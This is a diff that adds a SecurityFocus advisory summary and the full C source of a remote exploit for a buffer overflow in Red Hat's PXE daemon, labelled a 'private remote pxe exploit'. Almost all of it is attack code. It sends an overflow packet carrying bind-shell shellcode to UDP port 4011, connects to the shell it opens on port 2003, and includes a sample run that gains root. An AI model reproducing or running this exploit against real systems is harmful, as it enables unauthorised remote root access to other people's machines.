@@ -1,0 +1,179 @@
+source: http://www.securityfocus.com/bid/7129/info
+
+A vulnerability has been discovered in PXE which is included with Red Hat Linux. Specifically, it is possible for a remote attacker to overrun a buffer by passing excessive data to the service. This may result in the corruption of sensitive process memory, and as such may allow an attacker to execute arbitrary commands.
+
+This issue has been reported to exist in PXE 2.0 Beta-1 on Red Hat Linux. Other versions may also be affected by this vulnerability.
+
+
+me: 85pxe.c
+/
+\  Target daemon: Intel PXE daemon, PXE-2.0 Beta-1 (build 001)
+/
+\  Created by CrZ [crazy_einstein@yahoo.com] LByte [lbyte.void.ru] /13.03.03/
+/
+\  Bug was discovered by n-arrow @efnet
+/
+\  !!! PRIVATE REMOTE PXE EXPLOIT !!!
+/
+\  Description: pxe is a daemon included in RedHat8.0 distr.
+/               this daemon bind socket on 4011 udp port.
+\
+/  Important Note: pxe will crush if return address isn't valid.
+\                  So.. make sure that return address is valid :)
+/  
+\  Tested against: RedHat 8.0 (Psyche)
+/
+\  Example of work:
+/
+\[crz@blacksand tmp]$ ./85pxe -h blacksand -t 0
+/
+\LimpidByte private remote pxe exploit by CrZ [crazy_einstein@yahoo.com]
+/
+\[!] Connecting to blacksand:4011
+/[+] Connected!
+\[!] Using 0xbffff05c return address!
+/[>] Sending shellcode!
+\[*] Trying to connect to blacksand:2003 port!!! Pray for success!
+/[*] Sleeping at 2 seconds...
+\[!] Connected! Here comes the shell baby...x)
+/
+\uid=0(root) gid=0(root)
+/Linux blacksand 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
+\exit
+/[!] Connection closed.
+\[crz@blacksand tmp]$
+/
+\
+*/
+#include <stdio.h>
+#include <netinet/in.h>  
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+/* bind shell upon 2003 port */
+char shell[] =
+         "\x31\xc0\x89\xc3\xb0\x02\xcd\x80\x38\xc3\x74\x05\x8d\x43\x01\xcd\x80"
+         "\x31\xc0\x89\x45\x10\x40\x89\xc3\x89\x45\x0c\x40\x89\x45\x08\x8d\x4d"
+ "\x08\xb0\x66\xcd\x80\x89\x45\x08\x43\x66\x89\x5d\x14\x66\xc7\x45\x16"
+ "\x07\xd3\x31\xd2\x89\x55\x18\x8d\x55\x14\x89\x55\x0c\xc6\x45\x10\x10"
+ "\xb0\x66\xcd\x80\x40\x89\x45\x0c\x43\x43\xb0\x66\xcd\x80\x43\x89\x45"
+ "\x0c\x89\x45\x10\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41"
+ "\x80\xf9\x03\x75\xf6\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+ "\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+  
+struct TARGETS {
+char *distr;
+long ret;
+} targets[] = { {"RedHat 8.0 (Psyche)", 0xbffff05c} };
+ 
+long getip(char *hostname) {
+struct hostent *he;
+long ipaddr;
+
+if ((ipaddr = inet_addr(hostname)) < 0) {
+if ((he = gethostbyname(hostname)) == NULL) {
+perror("gethostbyname()");
+exit(-1);
+}
+memcpy(&ipaddr, he->h_addr, he->h_length);
+}
+return ipaddr;
+}
+void usage(char *prog) {
+int i=0;
+
+printf("\nUsage: %s <-h www.victim.com> [-p port] [-t target] [-r manual_retaddr]\n\nTargets:\n",prog);
+while(targets[i++].distr) printf("\t[%d] -> %s\n",i-1,targets[i-1].distr);
+printf("\n");
+exit(0);
+}
+int main(int argc, char **argv) {
+ 
+    int i=0;     
+    struct sockaddr_in sockstruct;
+    struct hostent *HOST;
+    char tmp[10000];
+    int sock;
+    fd_set  rset;
+int port=4011,shellport=2003;
+char *victim=NULL;
+long ret=0,ret1,ret2,ret3;
+printf("\nLimpidByte private remote pxe exploit by CrZ [crazy_einstein@yahoo.com]\n");
+for(i=0;i<argc;i++) {
+if(argv[i][1]=='h') victim=argv[i+1];
+if(argv[i][1]=='p') port=atoi(argv[i+1]);
+if(argv[i][1]=='t') ret=targets[atoi(argv[i+1])].ret;
+                if(argv[i][1]=='r') sscanf(argv[i+1],"0x%x",&ret);
+}
+if(!victim || ret==0) usage(argv[0]);
+/* prepare for our smart trick :) */
+ret1=ret+2;
+ret2=ret+3;
+ret3=ret;
+    
+    sock=socket(PF_INET,SOCK_DGRAM,17);
+    sockstruct.sin_family=PF_INET; 
+    sockstruct.sin_addr.s_addr=getip(victim);
+    sockstruct.sin_port=htons(port);
+    printf("\n[!] Connecting to %s:%d\n",victim,port);
+   
+      if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {
+        printf("[+] Connected!\n",i);
+/* the main trick */
+bzero(tmp,sizeof tmp);
+memcpy(tmp,&ret1,4);
+memcpy(tmp+4,&ret2,4);
+memset(tmp+8,0x90,894-8);
+memcpy(tmp+894,&shell,sizeof shell);
+memcpy(tmp+1024,&ret3,4);
+printf("[!] Using 0x%x return address!\n",ret);
+printf("[>] Sending shellcode!\n");
+write(sock,tmp,1024 + 4);
+      }
+    
+      close(sock);
+printf("[*] Trying to connect to %s:%d port!!! Pray for success!\n",victim,shellport);
+printf("[*] Sleeping at 2 seconds...\n");
+sleep(2);
+
+        sock=socket(PF_INET,SOCK_STREAM,0);
+bzero(sockstruct.sin_zero,sizeof(sockstruct.sin_zero));
+sockstruct.sin_family=PF_INET; 
+        sockstruct.sin_addr.s_addr=getip(victim);
+        sockstruct.sin_port=htons(shellport);
+        if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {
+        printf("[!] Connected! Here comes the shell baby...x)\n\n");
+        write(sock, "id;uname -a\n", 12); 
+        while (1) {
+                FD_ZERO(&rset);
+                FD_SET(sock,&rset);
+                FD_SET(STDIN_FILENO,&rset);
+                select(sock + 1, &rset, NULL, NULL, NULL);
+       if (FD_ISSET(sock, &rset)) {
+                        i = read(sock, tmp, sizeof(tmp) - 1);
+                        if (i <= 0) {
+                                printf("[!] Connection closed.\n");
+                                close(sock);
+                                exit(0);
+                        }
+                        tmp[i] = 0;
+                        printf("%s", tmp);
+                }
+                if (FD_ISSET(STDIN_FILENO, &rset)) {
+                        i = read(STDIN_FILENO, tmp, sizeof(tmp) - 1);
+                        if (i > 0) {
+                                tmp[i]=0;
+                                write(sock, tmp, i);
+                        }
+                }
+        }
+        } else printf("[x] Bad luck x(\n\n");
+        close(sock);
+
+      
+    return 0;
+}
